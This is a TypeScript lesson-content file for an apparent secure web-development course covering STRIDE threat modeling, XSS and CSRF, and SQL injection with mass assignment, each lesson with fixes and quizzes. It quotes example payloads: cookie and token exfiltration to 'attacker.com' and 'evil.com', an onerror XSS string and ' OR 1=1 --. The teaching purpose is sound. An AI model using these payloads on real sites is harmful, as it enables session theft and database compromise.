import type { LessonContent } from "./types";

export const LESSON_CONTENT_P30: Record<string, LessonContent> = {
  "p30-l1": {
    id: "p30-l1",
    phaseId: "p30",
    title: "Threat Modeling & Trust Boundaries",
    level: "Advanced",
    minutes: 40,
    summary:
      "Map out attack surfaces, security trust boundaries, and asset classifications across your full-stack architecture using the STRIDE threat model framework.",
    prerequisites: ["p18-l1 RBAC & Permissions", "p07-l1 HTTP Fundamentals"],
    objectives: [
      "Identify the 4 core trust boundaries in modern web architectures.",
      "Apply the STRIDE threat matrix (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege).",
      "Produce a practical, lightweight threat model diagram for a full-stack SaaS application.",
    ],
    simple:
      "Threat modeling is the engineering practice of asking 4 questions before writing code: What are we building? What can go wrong? What are we going to do about it? Did we do a good job? By identifying where untrusted input crosses from the public internet into your internal network (Trust Boundaries), you can place defenses where they actually matter.",
    why:
      "Adding security patches after a breach is 100x more expensive than designing trust boundaries into your system upfront.",
    mentalModel: {
      title: "Airport Security Checkpoints",
      body:
        "An airport has clear zones: Public Curbside (anyone can enter), TSA Checkpoint (identity and luggage inspected), Secure Terminal (only ticketed passengers), and Cockpit Door (multi-factor biometric access). In software, crossing from Browser to API Gateway or API to Database are your security checkpoints.",
    },
    sections: [
      {
        heading: "1. The 4 Trust Boundaries in Web Applications",
        body: [
          "A **Trust Boundary** is any border where data moves from a lower-trust zone to a higher-trust zone:",
          "1. **Browser / Mobile Client → Edge Reverse Proxy (Nginx / Cloudflare)**: Public untrusted network. Attackers can forge headers, spoof IPs, send malformed TLS packets.",
          "2. **API Gateway → Application Backend (NestJS / Fastify)**: Authenticated but untrusted input. Users can submit arbitrary JSON payloads, SQL injections, or IDOR exploits.",
          "3. **Application Backend → Data Layer (Postgres / Redis / S3)**: Trusted internal network. Protected by strict VPC rules, network policies, and principle of least privilege.",
          "4. **Application Backend → Third-Party APIs (Stripe, OpenAI, Resend)**: External egress boundary. Protected by circuit breakers, timeout limits, and secret vaults.",
        ],
        code: [
          {
            file: "stride-matrix.ts",
            lang: "ts",
            code: [
              "// STRIDE Threat Model Matrix for Full-Stack Systems:",
              "// ---------------------------------------------------------------------------------",
              "// Threat                | Security Property  | Primary Mitigation",
              "// ---------------------------------------------------------------------------------",
              "// S - Spoofing          | Authentication     | JWT, OAuth 2.0, WebAuthn MFA",
              "// T - Tampering         | Integrity          | HMAC signatures, TLS, DB Constraints",
              "// R - Repudiation       | Non-repudiation    | Append-only Immutable Audit Logs",
              "// I - Info Disclosure   | Confidentiality    | DTO serialization, AES-256 encryption",
              "// D - Denial of Service | Availability       | Rate limiting, Redis token buckets, WAF",
              "// E - Elevation of Priv | Authorization      | Strict RBAC / ABAC Guards, no IDOR",
            ].join("\n"),
            caption: "STRIDE framework applied to cloud engineering.",
          },
        ],
      },
    ],
    mistake: {
      title: "Assuming Microservices on the Internal VPC Do Not Need Authentication",
      wrong: [
        "// ❌ Internal microservice endpoint with zero auth:",
        "@Get('/internal/users/:id/ssn')",
        "getSensitiveData(@Param('id') id: string) { return db.users.findUnique(...); }",
        "// If an attacker exploits SSRF in any public service, they have total access to the internal network!",
      ].join("\n"),
      right: [
        "// ✅ Zero-Trust Architecture: Mutual TLS (mTLS) or Signed Service-to-Service JWTs for internal RPCs",
        "@UseGuards(InternalServiceAuthGuard)",
        "@Get('/internal/users/:id/ssn')",
      ].join("\n"),
    },
    exercise: {
      title: "Lab: Threat Model TaskForge SaaS",
      description:
        "Diagram a collaborative task manager with file uploads and team billing, identifying at least one STRIDE threat at each trust boundary.",
      tasks: [
        "Map the trust boundary between browser canvas and S3 direct uploads (Tampering).",
        "Map the trust boundary between Stripe webhooks and the billing service (Spoofing).",
        "Document required controls for each boundary.",
      ],
    },
    quiz: [
      {
        question: "Which STRIDE threat category is mitigated by immutable, append-only audit logs?",
        options: [
          "Information Disclosure",
          "Repudiation",
          "Elevation of Privilege",
          "Spoofing",
        ],
        answer: 1,
        explanation:
          "Repudiation occurs when a user denies performing an action (e.g. 'I never deleted that project'); immutable audit logs prove beyond doubt who initiated the transaction.",
      },
    ],
  },

  "p30-l2": {
    id: "p30-l2",
    phaseId: "p30",
    title: "Lab: XSS & CSRF — Reproduce, Impact, Fix",
    level: "Advanced",
    minutes: 45,
    summary:
      "Deep dive into client-side vulnerabilities. Reproduce Stored/Reflected/DOM XSS, understand the mechanics of Cross-Site Request Forgery, and implement defense-in-depth using React escaping, CSP headers, and SameSite cookie policies.",
    prerequisites: ["p04-l1 React Basics", "p30-l1 Threat Modeling"],
    objectives: [
      "Reproduce Stored XSS via unescaped `dangerouslySetInnerHTML` and fix with DOMPurify.",
      "Understand why `SameSite=Lax/Strict` cookies eliminate CSRF for modern web applications.",
      "Configure a strict Content Security Policy (CSP) header using Helmet.",
    ],
    simple:
      "XSS (Cross-Site Scripting) happens when your app takes text submitted by one user (like a comment containing `<script>fetch('attacker.com?c='+document.cookie)</script>`) and renders it directly into another user's browser as executable JavaScript. CSRF (Cross-Site Request Forgery) happens when a malicious site tricks your browser into sending a POST request to your bank with your saved cookies.",
    why:
      "A single XSS vulnerability grants an attacker total control of the victim's session, keystrokes, and DOM context.",
    mentalModel: {
      title: "The Counterfeit Stamp vs the Trojan Horse",
      body:
        "CSRF is a counterfeit stamp: an evil site sends an envelope to your bank using your browser's real return address and cookies. XSS is a Trojan horse: malicious code sneaks inside your actual castle gates and executes with full administrative privileges.",
    },
    sections: [
      {
        heading: "1. XSS Mechanics & DOMPurify Sanitization",
        body: [
          "- **React Safety**: React automatically escapes strings inside JSX `{userName}` by converting `<` to `&lt;` and `>` to `&gt;`.",
          "- **Vulnerability Vector**: Using `dangerouslySetInnerHTML` for rich text markdown without sanitization, or unvalidated `href={userProvidedUrl}` (e.g. `href='javascript:alert(1)'`).",
          "- **Sanitization**: Always sanitize untrusted HTML on the server and client using `DOMPurify` or `sanitize-html`.",
        ],
        code: [
          {
            file: "safe-rich-text.tsx",
            lang: "tsx",
            code: [
              "import DOMPurify from 'dompurify';",
              "",
              "interface MarkdownViewerProps {",
              "  untrustedHtml: string;",
              "}",
              "",
              "export function SafeRichTextViewer({ untrustedHtml }: MarkdownViewerProps) {",
              "  // Strip all malicious <script>, <iframe>, and event handlers (onload, onerror)",
              "  const cleanHtml = DOMPurify.sanitize(untrustedHtml, {",
              "    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li', 'code', 'pre'],",
              "    ALLOWED_ATTR: ['href', 'target', 'rel'],",
              "  });",
              "",
              "  return (",
              "    <div",
              "      className=\"prose dark:prose-invert\"",
              "      dangerouslySetInnerHTML={{ __html: cleanHtml }}",
              "    />",
              "  );",
              "}",
            ].join("\n"),
            caption: "Sanitizing HTML with DOMPurify before React rendering.",
          },
        ],
      },
      {
        heading: "2. Modern CSRF Defense: SameSite Cookies",
        body: [
          "Legacy applications used synchronizer CSRF tokens in hidden form inputs.",
          "**Modern Standard**: Setting `SameSite: 'Lax'` or `'Strict'` on all session cookies tells the browser NEVER to attach session cookies when a request originates from an external third-party domain (e.g. `evil-site.com`).",
          "Ensure cookies always use: `HttpOnly; Secure; SameSite=Lax; Path=/`.",
        ],
      },
    ],
    mistake: {
      title: "Allowing 'javascript:' URLs in Dynamic User Links",
      wrong: [
        "// ❌ Unchecked dynamic href:",
        "<a href={user.websiteUrl}>Visit Website</a>",
        "// Attacker sets websiteUrl = 'javascript:document.location=\"http://evil.com/steal?token=\"+localStorage.getItem(\"token\")'",
      ].join("\n"),
      right: [
        "// ✅ Enforce safe HTTP/HTTPS URL protocols:",
        "const isSafeUrl = /^https?:\\/\\//i.test(user.websiteUrl);",
        "<a href={isSafeUrl ? user.websiteUrl : '#'} rel=\"noopener noreferrer\">Visit Website</a>",
      ].join("\n"),
    },
    exercise: {
      title: "Lab: Reproduce XSS in a Comment Box and Patch It",
      description:
        "Build a rich-text comment component, trigger an alert payload, and verify that DOMPurify strips out malicious tags.",
      tasks: [
        "Inject `<img src=x onerror=alert(document.domain)>` into the input.",
        "Demonstrate how unescaped innerHTML executes the script.",
        "Apply DOMPurify with strict tag allowlists and verify the alert no longer triggers.",
      ],
    },
    quiz: [
      {
        question: "Why does setting the HttpOnly flag on cookies protect against XSS credential theft?",
        options: [
          "It prevents client-side JavaScript (document.cookie) from reading the cookie value even if an attacker achieves XSS execution.",
          "It encrypts the database records.",
          "It prevents the server from reading headers.",
          "It blocks all incoming HTTP POST requests.",
        ],
        answer: 0,
        explanation:
          "HttpOnly tells the browser that the cookie must only be transmitted in HTTP headers and is inaccessible to document.cookie in JavaScript.",
      },
    ],
  },

  "p30-l3": {
    id: "p30-l3",
    phaseId: "p30",
    title: "Lab: SQL Injection & Mass Assignment",
    level: "Advanced",
    minutes: 45,
    summary:
      "Examine two of the most destructive server-side vulnerabilities in the OWASP Top 10. Exploit raw SQL string concatenation, demonstrate Mass Assignment privilege escalation, and implement DTO whitelisting and parameterized queries.",
    prerequisites: ["p13-l1 Postgres Fundamentals", "p14-l1 Prisma Core"],
    objectives: [
      "Understand why raw string concatenation in SQL queries leads to complete database compromise.",
      "Prevent Mass Assignment using NestJS `ValidationPipe({ whitelist: true, forbidNonWhitelisted: true })`.",
      "Use Prisma `$queryRaw` safely with tagged template literals (parameterized bindings).",
    ],
    simple:
      "SQL Injection happens when untrusted user input is glued into a SQL query string (`SELECT * FROM users WHERE email = '` + email + `'`), letting an attacker type `' OR 1=1 --` to log in as admin without a password. Mass Assignment happens when your backend takes an entire raw request body and passes it directly to `prisma.user.update()`, allowing a user to include `{ isAdmin: true }` in their profile update.",
    why:
      "SQL injection gives attackers read and write access to your entire database, while mass assignment allows standard users to elevate their privileges to superadmin with one curl command.",
    mentalModel: {
      title: "The Pre-Printed Fill-in-the-Blank Form",
      body:
        "Parameterized queries treat SQL code as a fixed, pre-compiled template with blanks (`$1`, `$2`). Even if the user types SQL keywords into the blank, the database engine treats it strictly as literal string characters, never executable instructions.",
    },
    sections: [
      {
        heading: "1. Parameterized Queries vs String Interpolation in Prisma",
        body: [
          "- **Prisma standard queries** (`findUnique`, `update`) are automatically 100% immune to SQL injection because Prisma uses parameterized queries under the hood.",
          "- **Risk with Raw SQL**: If you use Prisma `$queryRawUnsafe()`, you introduce SQL injection.",
          "- **Safe Raw SQL**: Always use `prisma.$queryRaw` with tagged template literals. Prisma automatically extracts variables into parameterized PostgreSQL `$1`, `$2` bindings.",
        ],
        code: [
          {
            file: "sql-safety.ts",
            lang: "ts",
            code: [
              "import { PrismaClient, Prisma } from '@prisma/client';",
              "const prisma = new PrismaClient();",
              "",
              "// ❌ FATAL SQL INJECTION VULNERABILITY:",
              "// const query = `SELECT * FROM users WHERE email = '${userInput}'`;",
              "// await prisma.$queryRawUnsafe(query);",
              "",
              "// ✅ 100% SAFE: Parameterized Tagged Template Literal",
              "export async function findUserByEmailSafe(email: string) {",
              "  // Prisma compiles this to: SELECT * FROM users WHERE email = $1 with binding [email]",
              "  return await prisma.$queryRaw<User[]>`",
              "    SELECT id, email, role, created_at",
              "    FROM users",
              "    WHERE email = ${email}",
              "  `;",
              "}",
            ].join("\n"),
            caption: "Safe parameterized raw SQL in Prisma.",
          },
        ],
      },
      {
        heading: "2. Mass Assignment & DTO Whitelisting",
        body: [
          "When a user submits `PATCH /users/me` with `{ bio: 'Hello', role: 'SUPER_ADMIN' }`, passing `req.body` directly to the database updates the `role` column.",
          "**Defenses**:",
          "1. Global ValidationPipe with `whitelist: true` (strips unknown properties).",
          "`forbidNonWhitelisted: true` (throws HTTP 400 if malicious fields are present).",
          "2. Explicit Prisma update payload mapping (`data: { bio: dto.bio }`).",
        ],
        code: [
          {
            file: "main-security-pipe.ts",
            lang: "ts",
            code: [
              "// main.ts - Strict DTO Whitelisting Global Pipe",
              "app.useGlobalPipes(",
              "  new ValidationPipe({",
              "    whitelist: true, // Strips any property without a class-validator decorator",
              "    forbidNonWhitelisted: true, // Throws 400 Bad Request if unexpected properties are sent",
              "    transform: true,",
              "  }),",
              ");",
            ].join("\n"),
            caption: "Global ValidationPipe configuration.",
          },
        ],
      },
    ],
    mistake: {
      title: "Passing the Entire req.body Directly to Prisma Update",
      wrong: [
        "// ❌ Mass assignment vulnerability:",
        "@Patch('profile')",
        "updateProfile(@Body() body: any, @CurrentUser() user: AuthUser) {",
        "  return this.prisma.user.update({ where: { id: user.id }, data: body });",
        "}",
      ].join("\n"),
      right: [
        "// ✅ Explicit DTO with validated fields only:",
        "@Patch('profile')",
        "updateProfile(@Body() dto: UpdateProfileDto, @CurrentUser() user: AuthUser) {",
        "  return this.prisma.user.update({",
        "    where: { id: user.id },",
        "    data: { bio: dto.bio, avatarUrl: dto.avatarUrl },",
        "  });",
        "}",
      ].join("\n"),
    },
    exercise: {
      title: "Lab: Exploit Mass Assignment and Immunize with DTOs",
      description:
        "Send a curl request containing an unapproved `isVerified: true` property, observe the 400 rejection from ValidationPipe, and verify the user record remains unchanged.",
      tasks: [
        "Create an `UpdateProfileDto` with only `displayName` and `bio`.",
        "Attempt to send `{ displayName: 'Alice', isVerified: true }`.",
        "Verify that `forbidNonWhitelisted` throws `400 Bad Request: property isVerified should not exist`.",
      ],
    },
    quiz: [
      {
        question: "Why is prisma.$queryRaw`SELECT * FROM users WHERE id = ${userId}` safe against SQL injection?",
        options: [
          "Because JavaScript strings cannot contain single quotes.",
          "Because TypeScript checks types at runtime.",
          "Because ES6 Tagged Template Literals allow Prisma to convert interpolated variables into parameterized PostgreSQL placeholders ($1, $2) automatically.",
          "Because Postgres automatically disables SQL injection.",
        ],
        answer: 2,
        explanation:
          "Tagged template functions receive the raw string chunks and expression values separately, enabling Prisma to parameterize the values safely before query execution.",
      },
    ],
  },
};
